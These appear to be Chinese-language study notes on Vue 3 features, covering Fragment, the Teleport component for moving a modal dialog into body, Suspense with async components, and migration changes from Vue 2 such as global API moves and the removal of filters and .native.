- 在vue2中 组件必须有一个根标签
- 在vue3中 组件可以没有根标签 内部会将多个标签包含在一个Fragment虚拟元素中 最后Frament是不参与渲染的

- 好处：
- 减少标签层级 减小内存占用   

--------------------------

### Teleprot组件
- 什么是Teleport 它是一种能够将我们的组件html结构移动到指定位置的技术

- 我们先看一个场景 还是 app - child - son 层层嵌套的组件结构
- 我们在son组件需要一个对话框组件 对话框组件的内容简单的是 点击打开弹窗，点击关闭弹窗
<!-- 
import {ref} from 'vue'
export default {
  name: 'Dialog',
  setup() {
    let isShow = ref(false)

    return {
      isShow
    }
  }
}
 -->

- 但是有个问题，随着弹窗的打开和关闭 整个son组件的高度会产生变化 比如打开弹窗后页面会被撑开太高，点击关闭son组件的高度又回到原来的状态 用户体验不好

- 不仅如此 这个弹窗在son组件里面的一个对话框组件，一般我们使用对话框组件都希望移动对话框的位置到屏幕中间 然后周围加一些遮罩的效果 但是处于现在的这种状态 想要调整对话框的位置特别的费劲

- 定位不可以么？ 不行 因为我们是根据父元素定位，app - child - son - dialog 其中任何一个元素变动它们也有定位的元素都有可能影响到 dialog的位置

- 这时候我们就可以使用这个 Teleprot 组件 把这个对话框 传送走 使用这个组件我们可以让 对话框 想让它去哪就去哪

> <teleport to="body">目标结构</teleport> 
- 我们可以使用这个组件 将要 传送的目标结构 用这个标签进行包裹
- 然后使用 to 属性 移动到 想要的结构标签中 比如html 比如body
- to:
  html标签
  css选择器
<!-- 
  <template>
    <div>
      <button @click='isShow = true'>click me</button>
      <teleport to="body">

        // 这个结构会直接出现在body里面 也就是 div#app 的同级
        <div v-if="isShow" class="dialong">
          <h3>我是一个弹窗</h3>
          <button @click='isShow = false'>close me</button>
        </div>

      </teleport>
    </div>
  </template>
 -->

- 上面那样操作可以将结构传递到body下面 这样还有一个好处就是定位的时候 可以直接参考body去定位了 不会受其他的组件结构的影响


> 遮罩层的逻辑
- 1. 给对话框组件的外层加一个div当做遮罩层
- 2. 将对话框的结构放在遮罩div的里面
- 3. 遮罩层的div上v-if
<!-- 
  <template>
    <div>
      <button @click='isShow = true'>click me</button>
      <teleport to="body">
        
        遮罩层的div 因为弹窗在遮罩层的里面 弹窗弹出来的时候再遮罩 遮罩层一出来 对话框自然就出来了
        <div v-if="isShow" class="mask">
          <div class="dialong">
            <h3>我是一个弹窗</h3>
            <button @click='isShow = false'>close me</button>
          </div>
        </div>
      </teleport>
    </div>
  </template>

  .mask {
    position: absolute;
    top:0; bottom:0; left: 0;  right: 0;
    background-color: rgba(0,0,0,.4);
  }
  .dialong {
    position: absolute;
    top:50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 200px;
    height:120px;
    background-color: pink;
    padding:10px;
  }
 -->

--------------------------

### Suspense组件
- 什么是异步组件：
- 

- 等待异步组件时渲染一些额外的内容 让应用有更好的用户体验 该api处于试验阶段 以后的相关api还可能会改

> defineAsyncComponent
- import {defineAsyncComponent} from 'vue'
- 定义一个异步组件
- 动态引入一个组件
<!-- 
  // 动态/异步引入
  const Child = defineAsyncComponent(() => import("./components/child.vue"))
 -->

-  静态引入
- import Child from "./components/child.vue"
- 这种方式是我们经常用的一种方式，它的效果就是 组件一起出来，一个不出来剩下的也别想出来


- 动态引入
- const Child = defineAsyncComponent(() => import("./components/child.vue"))
- 这种方式就是异步引入组件谁先加载完谁先出来


> 渲染流程
- 使用静态引入 只要组件没有引入成功 我整个app组件都不进行渲染 要等待目标组件引入完成
- 整个应用什么时候展示出来取决于最慢的那个组件


- 使用动态引入就不会出现上述的问题 但是也有一个问题
- 就是app组件先回来会先展示 但是用户还以为页面里面没有东西呢

- 为了解决这个问题 满足用户的体验 我们就可以使用这个 Suspense 组件
<!-- 
  弹幕上也有人说 可以是用 loading 或者 骨架屏
 -->

> <Suspense>包裹异步方式引入的组件</Suspense>
- 这个组件的实现方式 本身也是利用了 插槽 来实现的
- suspense里面准备了两个插槽 一个用于放置我们异步引入的组件 一个插槽放置当异步组件还没有回来的时候展示的内容

- 也就是说 <Suspense> 的结构是这样的
<!-- 
  <Suspense>

    <template v-slot:default>
      用于放置异步组件
    </template> 

    <template v-slot:fallback>
      用于放置组件来没有回来时候的展示内容
    </template> 

  </Suspense>
 -->


<!-- 
  <template>
    <div class="app">
      <h3>App</h3>
      <Suspense>

        <template v-slot:default>
          <Child />
        </template> 

        <template v-slot:fallback>
          <h3>稍等加载中。。。</h3>
        </template> 

      </Suspense>
    </div>
  </template>

  // 下面方式 只能是异步组件 和 suspense 搭配使用的时候才能这么干
  // 为了查看效果 我们可以这样 在child组件中
  setup() {
    let sum = ref(0)
    return new Promise((resolve, reject) => {
      setTimeout(() => {
        resolve({sum})
      }, 3000)
    })
  }
 -->

--------------------------

### Vue3中的其它变化
> 1. 全局 api 的转义
- vue2中有许多全局api和配置 比如
- Vue.component 注册全局组件
- Vue.directive 注册全局指令

- 但是在vue3中 vue不再给我们提供Vue构造函数了 导致原来的api不能够调用了
- vue3做了一些转义 将原来放在 Vue 身上的api 转移到了 app 身上
<!-- 
  Vue.config.xxx  ---  app.config.xxx

  Vue.config.productionTip
                  ---  delete

  Vue.component   ---  app.component
  Vue.directive   ---  app.directive
  Vue.mixin       --- app.mixin
  Vue.use         --- app.use
  Vue.prototype   -- app.config.globalProperties
 -->


> 2. 其它的改变
- 1. data选项应始终被声明为一个函数
- 2. 过渡类名的更改

    vue2
    .v-enter,
    .v-leave-to

    vue3
    .v-enter-from
    .v-leave-to


- 3. 移除keyCode作为v-on的修饰符 同时不再支持config.keyCodes
- 4. 移除v-on.native修饰符
<!-- 
  子组件中声明自定义事件 在vue2中 给组件绑定事件的时候

  如果： 这么写 点碎也不会触发 因为 vue 把click当成了 自定义事件
  如果在vue2中想给组件绑定原生事件 要加上.native
  <Demo @click="handleData">

  在vue3中废弃了 用于辨识是不是原生事件 的修饰符.native 是因为我们需要在
  子组件中使用 emits 配置项 声明接收 自定义事件
  emits:["close"]

  <Demo @click="handleData">
  <Demo @close="handleData">

  // 子组件使用 emits 接收自定义事件 没接收的就是原生事件
  emits:["close"]
 -->

- 5. 移除了过滤器
- 过滤器虽然看起来很方便 但它需要一个自定义语法 打破大括号内表达式是 只是javascript的假设 
- 这不仅有学习成本 而且有实现成本 建议用方法调用或计算属性去替换过滤器


